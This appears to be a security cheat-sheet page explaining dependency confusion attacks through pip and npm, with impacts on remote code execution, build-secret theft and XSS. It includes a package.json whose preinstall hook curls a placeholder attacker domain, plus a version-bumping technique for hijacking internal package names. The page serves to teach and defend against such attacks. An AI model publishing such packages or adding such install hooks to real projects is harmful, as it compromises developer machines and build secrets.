# Dependency Confusion

## Table of Contents

- [RCE](#rce)
- [Credential Stealing](#credential-stealing)
- [XSS](#xss)

## RCE

### Code that the attacker publishes under the name of an internal package runs wherever the dependency is installed, including developer machines and build servers. [^1]

- Installing from both an internal and a public index
    1. Install command used by the build
        ```bash
        pip install --extra-index-url https://[INTERNAL-REGISTRY]/simple/ [INTERNAL-PACKAGE]
        ```

    2. Package the attacker publishes on the public index
        ```text
        [INTERNAL-PACKAGE]==99.0.0
        ```
    pip considers both indexes and installs the highest version, so the attacker's package is chosen and its setup code runs during installation.

- Running an install script from a public npm package
    ```json
    {
        "name": "[INTERNAL-PACKAGE]",
        "version": "99.0.0",
        "scripts": {
            "preinstall": "curl https://[ATTACKER-DOMAIN]/"
        }
    }
    ```
    An internal registry that proxies the public one, or a machine without the internal registry configured, resolves the unscoped name to this package and runs `preinstall` with the privileges of the user installing it.
    - Alex Birsan, [Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610)

## Credential Stealing

### Secrets available to the build, such as cloud credentials, registry tokens, and signing keys, are exposed to the attacker's code. [^1]

- Reading secrets from the build environment
    - CI jobs usually receive secrets as environment variables or files, and an install script runs in the same environment. A token with publishing rights lets the attacker release further packages under the organization's name.

## XSS

### A package bundled into the front-end runs on the service's origin in every user's browser. [^1]

- Shipping the package in the production bundle
    - When the confused package is a front-end dependency, its code is included in the JavaScript the service serves. It has the same reach as a stored XSS on every page that loads the bundle, as described in [XSS](./XSS.md), until the dependency is replaced and the bundle is rebuilt.

[^1]: Applies when the internal package name is not registered on the public registry and the installer can fall back to it, for example pip with `--extra-index-url`, or an unscoped npm name resolved through a registry that proxies the public one.
